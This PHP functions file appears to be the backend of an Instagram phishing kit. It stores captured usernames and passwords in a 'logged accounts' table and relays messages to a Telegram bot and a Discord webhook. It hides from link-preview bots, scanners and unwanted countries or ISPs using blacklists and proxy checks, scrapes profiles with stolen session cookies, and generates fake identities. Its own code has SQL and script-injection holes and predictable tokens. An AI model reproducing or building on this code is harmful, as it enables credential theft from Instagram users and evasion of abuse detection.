<?php

function EPOCH_CONVERTER($unix){
    return gmdate('d/m/Y ( H:i:s )', $unix);
}

function IS_IT_IN_THE_DATABASE($DATABASE, $COLUMN_NAME, $VALUE){
    global $DB;
    $QUERY_DATABASE = $DB->query("SELECT * FROM $DATABASE", PDO::FETCH_ASSOC);
    $QUERY_DATABASE->rowCount();
        foreach($QUERY_DATABASE as $DATA){
            if($DATA["$COLUMN_NAME"] == $VALUE){
                return 1;
                exit();
            }
            else{
                return 0;
                exit();
            }
        }  
}

function DELETE_DIRECTORY($DIRECTORY_NAME) {
    if(is_dir($DIRECTORY_NAME)){
      $DIR_HANDLE = opendir($DIRECTORY_NAME);
	}
    if (!$DIR_HANDLE){
        return 0;
	}
    while($FILE = readdir($DIR_HANDLE)) {
        if ($FILE != "." && $FILE != "..") {
            if (!is_dir($DIRECTORY_NAME."/".$FILE))
                    unlink($DIRECTORY_NAME."/".$FILE);
            else
                    delete_directory($DIRECTORY_NAME.'/'.$FILE);
        }
    }
    closedir($DIR_HANDLE);
    rmdir($DIRECTORY_NAME);
	return 1;
}

function NEW_LOGGED_ACCOUNT($USERNAME, $PASSWORD){
    global $DB, $UNIX_DATE_AND_TIME;

    $QUERY_LOGGED_ACCOUNTS = $DB->prepare("INSERT INTO api_instagram_logged_accounts SET USERNAME = ?, PASSWORD = ?, DATE = ?");
    $INSERT_LOGGED_ACCOUNTS = $QUERY_LOGGED_ACCOUNTS->execute(array($USERNAME, $PASSWORD, $UNIX_DATE_AND_TIME));
        if($INSERT_LOGGED_ACCOUNTS){
            return 1;
            exit();
        }
        else{
            return 0;
            exit();
        }
}

function SWEET_ALERT($ICON, $TITLE, $TEXT, $BUTTON_TEXT, $FOOTER, $FOOTER_LINK, $REDIRECT_URL){
    if($BUTTON_TEXT == '0'){
        $BUTTON_TEXT = "Tamam";
    }

    $ALERT = "Swal.fire({icon: '$ICON', title: '$TITLE', text: '$TEXT', confirmButtonText: '$BUTTON_TEXT', background: '#191815', color: '#fff'";
    
    if($FOOTER_LINK !== 0){
        $ALERT = "$ALERT, footer: '<a href=$FOOTER_LINK>$FOOTER</a>'";
    }

    else{
        if($FOOTER !== 0){
            $ALERT = "$ALERT, footer: '<center>$FOOTER</center>'";
        }
    }

    if($REDIRECT_URL !== 0){
        $ALERT = "$ALERT}).then(function() { window.location = '$REDIRECT_URL'});";
    }
    else{
        $ALERT = "$ALERT});";
    }

    return "<script>$ALERT</script>";

}

function CHECK_BOT_REQUEST(){
    global $USER_AGENT;  
    $ARRAY_BOT_LIST = ["WhatsApp", "Bitrix", "TelegramBot"];
    foreach($ARRAY_BOT_LIST as $BOT){
        if(stripos($USER_AGENT, $BOT) !== false){
            return 1;
            exit();
        }
    }
    
    return 0;
}

function CHECK_WHITELIST(){
    global $IP_ADDRESS, $ISP, $USER_AGENT;

    $CHECK_IP_WHITELIST = IS_IT_IN_THE_DATABASE("whitelist_ip", "IP_ADDRESS", $IP_ADDRESS);
    if($CHECK_IP_WHITELIST == 1){
        return 1;
        exit();
    }
    $CHECK_ISP_WHITELIST = IS_IT_IN_THE_DATABASE("whitelist_isp", "ISP", $ISP);
    if($CHECK_ISP_WHITELIST == 1){
        return 1;
        exit();
    }
    $CHECK_USER_AGENT_WHITELIST = IS_IT_IN_THE_DATABASE("whitelist_useragent", "USER_AGENT", $USER_AGENT);
    if($CHECK_USER_AGENT_WHITELIST == 1){
        return 1;
        exit();
    }

    return 0;
}

function CHECK_BLACKLIST(){
    global $IP_ADDRESS, $ISP, $USER_AGENT, $COUNTRY;

    $CHECK_WHITELIST = CHECK_WHITELIST();
    if(!empty($CHECK_WHITELIST) OR $CHECK_WHITELIST != 0){
        return 0;
        exit();
    }
    $CHECK_IP_BLACKLIST = IS_IT_IN_THE_DATABASE("blacklist_ip", "IP_ADDRESS", $IP_ADDRESS);
    if($CHECK_IP_BLACKLIST == 1){
        return 1;
        exit();
    }
    $CHECK_ISP_BLACKLIST = IS_IT_IN_THE_DATABASE("blacklist_isp", "ISP", $ISP);
    if($CHECK_ISP_BLACKLIST == 1){
        return 1;
        exit();
    }
    $CHECK_USER_AGENT_BLACKLIST = IS_IT_IN_THE_DATABASE("blacklist_useragent", "USER_AGENT", $USER_AGENT);
    if($CHECK_USER_AGENT_BLACKLIST == 1){
        return 1;
        exit();
    }
    $CHECK_COUNTRY_BLACKLIST = IS_IT_IN_THE_DATABASE("blacklist_country", "COUNTRY", $COUNTRY);
    if($CHECK_COUNTRY_BLACKLIST == 1){
        return 1;
        exit();
    }

    return 0;
}

function GET_IP_DETAILS($IP_ADDRESS){
    $IP_DETAILS = json_decode(file_get_contents("http://ip-api.com/json/{$IP_ADDRESS}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query"));
        $QUERY = $IP_DETAILS->query;
        $STATUS = $IP_DETAILS->status;
        $CONTINENT = $IP_DETAILS->continent;
        $CONTITENT_CODE = $IP_DETAILS->continentCode;
        $COUNTRY = $IP_DETAILS->country;
        $COUNTRY_CODE = $IP_DETAILS->countryCode;
        $REGION = $IP_DETAILS->region;
        $REGION_NAME = $IP_DETAILS->regionName;
        $CITY = $IP_DETAILS->city;
        $ZIP = $IP_DETAILS->zip;
        $LAT = $IP_DETAILS->lat;
        $LON = $IP_DETAILS->lon;
        $TIMEZONE = $IP_DETAILS->timezone;
        $CURRENCY = $IP_DETAILS->currency;
        $ISP = $IP_DETAILS->isp;
        $ORG = $IP_DETAILS->org;
        $AS = $IP_DETAILS->as;
        $AS_NAME = $IP_DETAILS->asname;
        $MOBILE = $IP_DETAILS->mobile;
        $PROXY = $IP_DETAILS->proxy;
        $HOSTING = $IP_DETAILS->hosting;
    return $IP_DETAILS;
}

function CHECK_IP_QUALITY($IP_DATA){
    
    $CHECK_IP_TYPE_MOBILE = $IP_DATA->mobile;
    $CHECK_IP_TYPE_PROXY = $IP_DATA->proxy;
    $CHECK_IP_TYPE_HOSTING = $IP_DATA->hosting;

    if($CHECK_IP_TYPE_MOBILE == 1 AND $CHECK_IP_TYPE_PROXY == 0 AND $CHECK_IP_TYPE_HOSTING == 0){
        $IP_QUALITY = 'Excellent';
    }
    elseif($CHECK_IP_TYPE_MOBILE == 0 AND $CHECK_IP_TYPE_PROXY == 0 AND $CHECK_IP_TYPE_HOSTING == 0){
        $IP_QUALITY = 'Excellent';
    }
    elseif($CHECK_IP_TYPE_MOBILE == 1 AND $CHECK_IP_TYPE_PROXY == 1 AND $CHECK_IP_TYPE_HOSTING == 1){
        $IP_QUALITY = 'Moderate';
    }
    elseif($CHECK_IP_TYPE_MOBILE == 0 AND $CHECK_IP_TYPE_PROXY == 1 AND $CHECK_IP_TYPE_HOSTING == 1){
        $IP_QUALITY = 'Bad';
    }
    else{
        $IP_QUALITY = 'Bad';
    }

    return $IP_QUALITY;
}

function ADD_TO_BLACKLIST($QUERY, $VALUE){
    global $DB, $IP_ADDRESS, $USER_AGENT, $ISP, $COUNTRY, $COUNTRY_CODE, $REQUESTED_PAGE, $SESSION_USERNAME, $UNIX_DATE;

    if(empty($SESSION_USERNAME)){
        $SESSION_USERNAME = "SERVER";
    }

    if($QUERY == "blacklist_ip"){
        $SQL = "INSERT INTO $QUERY SET IP_ADDRESS = ?, USER_AGENT = ?, REQUESTED_PAGE = ?, DATE = ?";
        $ARRAY = array($VALUE, $USER_AGENT, $REQUESTED_PAGE, $UNIX_DATE);
    }
    elseif($QUERY == "blacklist_isp"){
        $SQL = "INSERT INTO $QUERY SET ISP = ?, ADMIN = ?, IP_ADDRESS = ?, DATE = ?";
        $ARRAY = array($VALUE, $SESSION_USERNAME, $IP_ADDRESS, $UNIX_DATE);
    }
    elseif($QUERY == "blacklist_country"){
        $SQL = "INSERT INTO $QUERY SET COUNTRY = ?, COUNTRY_CODE = ?, ADMIN = ?, IP_ADDRESS = ?, DATE = ?";
        $ARRAY = array($VALUE, $VALUE, $SESSION_USERNAME, $IP_ADDRESS, $UNIX_DATE);
    }
    elseif($QUERY == "blacklist_useragent"){
        $SQL = "INSERT INTO $QUERY SET USER_AGENT = ?, ADMIN = ?, IP_ADDRESS = ?, DATE = ?";
        $ARRAY = array($VALUE, $SESSION_USERNAME, $IP_ADDRESS, $UNIX_DATE);
    }
    elseif($QUERY == "blacklist_username"){
        $SQL = "INSERT INTO $QUERY SET USERNAME = ?, ADMIN = ?, IP_ADDRESS = ?, DATE = ?";
        $ARRAY = array($VALUE, $SESSION_USERNAME, $IP_ADDRESS, $UNIX_DATE);
    }
    $INSERT = $DB->prepare($SQL);
    $INSERT = $INSERT->execute($ARRAY);
    if($INSERT){
        return 1;
        exit();
    }
    else{
        return 0;
        exit();
    }

    return 0;
}

function ADD_TO_WHITELIST($QUERY, $VALUE){
    global $DB, $IP_ADDRESS, $USER_AGENT, $ISP, $COUNTRY, $SESSION_USERNAME, $UNIX_DATE;

    if(empty($SESSION_USERNAME)){
        $SESSION_USERNAME = "SERVER";
    }

    if($QUERY == "whitelist_ip"){
        $SQL = "INSERT INTO $QUERY SET IP_ADDRESS = ?, USER_AGENT = ?, COUNTRY = ?, ISP = ?, ADMIN = ?, DATE = ?";
        $ARRAY = array($VALUE, $USER_AGENT, $COUNTRY, $ISP, $SESSION_USERNAME, $UNIX_DATE);
    }
    elseif($QUERY == "whitelist_isp"){
        $SQL = "INSERT INTO $QUERY SET ISP = ?, ADMIN = ?, IP_ADDRESS = ?, DATE = ?";
        $ARRAY = array($VALUE, $SESSION_USERNAME, $IP_ADDRESS, $UNIX_DATE);
    }
    elseif($QUERY == "whitelist_useragent"){
        $SQL = "INSERT INTO $QUERY SET USER_AGENT = ?, ADMIN = ?, IP_ADDRESS = ?, DATE = ?";
        $ARRAY = array($VALUE, $SESSION_USERNAME, $IP_ADDRESS, $UNIX_DATE);
    }
    elseif($QUERY == "whitelist_username"){
        $SQL = "INSERT INTO $QUERY SET USERNAME = ?, ADMIN = ?, IP_ADDRESS = ?, DATE = ?";
        $ARRAY = array($VALUE, $SESSION_USERNAME, $IP_ADDRESS, $UNIX_DATE);
    }
    $INSERT = $DB->prepare($SQL);
    $INSERT = $INSERT->execute($ARRAY);
    if($INSERT){
        return 1;
        exit();
    }
    else{
        return 0;
        exit();
    }

    return 0;
}

function LOG_REQUEST_SITE(){
    global $IP_ADDRESS, $ISP, $COUNTRY, $UNIX_DATE, $USER_AGENT, $DB, $REQUESTED_PAGE, $CHECK_BLACKLIST, $CHECK_WHITELIST, $CHECK_BOT_REQUEST;

    if($CHECK_BLACKLIST == 0){ 
        $CLASS = "Safe"; 
    }
    elseif($CHECK_BLACKLIST == 1){ 
        $CLASS = "Blacklisted"; 
    }
    if($CHECK_WHITELIST == 1){
        $CLASS = "Whitelisted";
    }
    if($CHECK_BOT_REQUEST == 1){
        if($CHECK_BLACKLIST == 1){ 
            $CLASS = "Blacklisted Bot"; 
        }
        elseif($CHECK_WHITELIST == 1){ 
            $CLASS = "Whitelisted Bot"; 
        }
        else{
            $CLASS = "Bot";
        }
    }
    if(empty($CLASS)){
        $CLASS = "Unknown";
    }

    $SQL = "INSERT INTO request_site SET IP_ADDRESS = ?, USER_AGENT = ?, COUNTRY = ?, ISP = ?, REQUESTED_PAGE = ?,  CLASS = ?, DATE = ?";
    $QUERY = $DB->prepare($SQL);
    $ARRAY = array($IP_ADDRESS, $USER_AGENT, $COUNTRY, $ISP, $REQUESTED_PAGE, $CLASS, $UNIX_DATE);
    $INSERT = $QUERY->execute($ARRAY);
    if($INSERT){
        return 1;
        exit();
    }
    else{
        return 0;
        exit();
    }
}

function GENERATE_PASSWORD($count) {
    $ALPHABET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
    $PASSWORD = array(); 
    $ALPHABET_LENGHT = strlen($ALPHABET) - 1; 
    for ($i = 0; $i < $count; $i++) {
        $n = rand(0, $ALPHABET_LENGHT);
        $PASSWORD[] = $ALPHABET[$n];
    }
    return implode($PASSWORD); 
}

function stars($iban){
    $times=strlen(trim(substr($iban,2,20)));
    $star='';
    for ($i=0; $i <$times ; $i++) { 
        $star.='*';
    }
}

function ENCRYPT($DATA){
global $CIPHER, $KEY, $IV;
    $ENCRYPTED = openssl_encrypt($DATA, $CIPHER, $KEY, 0, $IV);
    return $ENCRYPTED;
}

function DECRYPT($DATA){
    global $CIPHER, $KEY, $IV;
        $DECRYPTED = openssl_decrypt(str_replace(' ', '+', $DATA), $CIPHER, $KEY, 0, $IV);
        return $DECRYPTED;
}

function GENERATE_CSRF_TOKEN(){
    $CSRF_TOKEN = encrypt(GENERATE_PASSWORD('18'));
    return $CSRF_TOKEN;
}

function LOG_USER_REQUEST($ADMIN, $ACTION){
    global $UNIX_DATE, $USER_AGENT, $DB, $IP_ADDRESS, $LOG_USER_WEBHOOK, $CURRENT_DOMAIN_HTTPS, $SESSION_DISCORD;

    $timestamp = date("c", strtotime("now"));
    $json_data = json_encode([

        /* "content" => "", */
        "username" => '(Your Server Name) Management Panel',
        "tts" => false,
        "embeds" => [
            [
                // Embed Title
                /* "title" => "", */

                // Embed Type
                "type" => "rich",

                // Embed Description
                "description" => $ACTION,

                // URL of title link
                "url" => $CURRENT_DOMAIN_HTTPS,

                // Timestamp of embed must be formatted as ISO8601
                "timestamp" => $timestamp,

                // Embed left border color in HEX
                "color" => hexdec( "3366ff" ),

                // Footer
                "footer" => [
                    "text" => "CFX#6666 | discord.gg/realityshop",
                    "icon_url" => "https://cdn.discordapp.com/attachments/1028014874875412610/1028015059391217716/un2known-min.png"
                ],

                // Image to send
                /* "image" => [
                    "url" => "https://ru.gravatar.com/userimage/28503754/1168e2bddca84fec2a63addb348c571d.jpg?size=600"
                ], */

                // Thumbnail
                //"thumbnail" => [
                //    "url" => "https://ru.gravatar.com/userimage/28503754/1168e2bddca84fec2a63addb348c571d.jpg?size=400"
                //],

                // Author
                "author" => [
                    "name" => "(Your Server Name) Management Panel",
                    "url" => $CURRENT_DOMAIN_HTTPS
                ],

                // Additional Fields array
                "fields" => [
                    // Field 1
                    [
                        "name" => "Manager's Information",
                        "value" => "**Username :** $ADMIN"."\n**Discord :** <@$SESSION_DISCORD>",
                        /* "value" => "**Username :** $ADMIN"."\n**ID :** $SESSION_USER_ID"."\n**IP :** $SESSION_IP_ADDRESS"."\n**Country :** $SESSION_COUNTRY"."\n**City :** $SESSION_CITY"."**\nISP :** $SESSION_ISP"."**\nUser Agent :** $SESSION_USER_AGENT", */
                        "inline" => true
                    ],
                    // Field 2
                    /* [
                        "name" => "Field #2 Name",
                        "value" => "Field #2 Value",
                        "inline" => true
                    ] */
                    // Etc..
                ]
            ]
        ]

    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


    $ch = curl_init( $LOG_USER_WEBHOOK );
    curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt( $ch, CURLOPT_POST, 1);
    curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
    curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt( $ch, CURLOPT_HEADER, 0);
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec( $ch );
    curl_close( $ch );

    $QUERY_REQUEST_USERS = $DB->prepare("INSERT INTO log_users SET IP_ADDRESS = ?, USER_AGENT = ?, USERNAME = ?, ACTION = ?, DATE = ?"); 
    $INSERT_REQUEST_USERS = $QUERY_REQUEST_USERS->execute(array($IP_ADDRESS, $USER_AGENT, $ADMIN, $ACTION, $UNIX_DATE));
        
    if($INSERT_REQUEST_USERS){
        return 1;
    }
    else{
        return 0;
    }
    
}

function CHECK_PERMISSION($ADMIN_TYPE, $PERMISSION){
    if(in_array($ADMIN_TYPE, $PERMISSION)){
        return 1;
    }
    else{
        return 0;
    }
}

function MESSAGE_TELEGRAM($MESSAGE){
    global $TELEGRAM_CHAT_ID, $TELEGRAM_TOKEN;
        $PARAMETER = array(
            'chat_id' => "$TELEGRAM_CHAT_ID",
            'text' => "
            $MESSAGE
            ");
        $ch = curl_init();
        $url = "https://api.telegram.org/bot".$TELEGRAM_TOKEN."/sendmessage";
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $PARAMETER);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
    
        return 1;
}

function GET_INSTAGRAM_ACCOUNT_DATA($username) {
    global $DB;
	
    $QUERY_INSTAGRAMAPI = $DB->query("SELECT * FROM api_instagram ORDER BY RAND() LIMIT 1", PDO::FETCH_ASSOC);
    $QUERY_INSTAGRAMAPI->rowCount();
    if($QUERY_INSTAGRAMAPI){
        foreach($QUERY_INSTAGRAMAPI as $INSTAGRAM){
            $API_ACCOUNT_USERNAME = $INSTAGRAM["USERNAME"];
            $API_ACCOUNT_PASSWORD = $INSTAGRAM["PASSWORD"];
            $API_ACCOUNT_EMAIL_ADDRESS = $INSTAGRAM["EMAIL_ADDRESS"];
            $API_ACCOUNT_EMAIL_PASSWORD = $INSTAGRAM["EMAIL_PASSWORD"];
            $API_ACCOUNT_SESSION_ID = $INSTAGRAM["SESSION_ID"];
        }
    }
    else{
        return 0;
        exit();
    }

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://www.instagram.com/{$username}/?__a=1&__d=dis");
    curl_setopt($ch, CURLOPT_REFERER, "i.instagram.com");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Cookie: ds_user='.$username.'; igfl='.$username .'; ds_user_id='.$username .'; sessionid='.$API_ACCOUNT_SESSION_ID.''));
	
    $response = curl_exec($ch);
    header('Content-Type: application/json');
	return $response;

}

function RANDOM_ITEM($ITEM_TYPE){ 
    $FIRST_NAME = array( 'Johnathon', 'Anthony', 'Erasmo', 'Raleigh', 'Nancie', 'Tama', 'Camellia', 'Augustine', 'Christeen', 'Luz', 'Diego', 'Lyndia', 'Thomas', 'Georgianna', 'Leigha', 'Alejandro', 'Marquis', 'Joan', 'Stephania', 'Elroy', 'Zonia', 'Buffy', 'Sharie', 'Blythe', 'Gaylene', 'Elida', 'Randy', 'Margarete', 'Margarett', 'Dion', 'Tomi', 'Arden', 'Clora', 'Laine', 'Becki', 'Margherita', 'Bong', 'Jeanice', 'Qiana', 'Lawanda', 'Rebecka', 'Maribel', 'Tami', 'Yuri', 'Michele', 'Rubi', 'Larisa', 'Lloyd', 'Tyisha', 'Samatha', ); 
    $LAST_NAME = array( 'Mischke', 'Serna', 'Pingree', 'Mcnaught', 'Pepper', 'Schildgen', 'Mongold', 'Wrona', 'Geddes', 'Lanz', 'Fetzer', 'Schroeder', 'Block', 'Mayoral', 'Fleishman', 'Roberie', 'Latson', 'Lupo', 'Motsinger', 'Drews', 'Coby', 'Redner', 'Culton', 'Howe', 'Stoval', 'Michaud', 'Mote', 'Menjivar', 'Wiers', 'Paris', 'Grisby', 'Noren', 'Damron', 'Kazmierczak', 'Haslett', 'Guillemette', 'Buresh', 'Center', 'Kucera', 'Catt', 'Badon', 'Grumbles', 'Antes', 'Byron', 'Volkman', 'Klemp', 'Pekar', 'Pecora', 'Schewe', 'Ramage', ); 
    
        $NAME = $FIRST_NAME[rand ( 0 , count($FIRST_NAME) -1)]; 
        $SURNAME = $LAST_NAME[rand ( 0 , count($LAST_NAME) -1)];
        $RANDOM_EMAIL = $NAME.$SURNAME;
        $RANDOM_EMAIL .= rand(100,999);
        $RANDOM_EMAIL .= '@outlook.com'; 
        $RANDOM_EMAIL = strtolower($RANDOM_EMAIL);
        if($ITEM_TYPE == 'EMAIL'){
            return $RANDOM_EMAIL; 
        }
        elseif($ITEM_TYPE == 'FULL_NAME'){
            return "$NAME:$SURNAME"; 
        }
        elseif($ITEM_TYPE == 'NAME'){
            return "$NAME"; 
        }
        elseif($ITEM_TYPE == 'SURNAME'){
            return "$SURNAME"; 
        }
        elseif($ITEM_TYPE == 'ALL_ITEM'){
            return "$RANDOM_EMAIL:$NAME:$SURNAME"; 
        }
        exit();
}
?>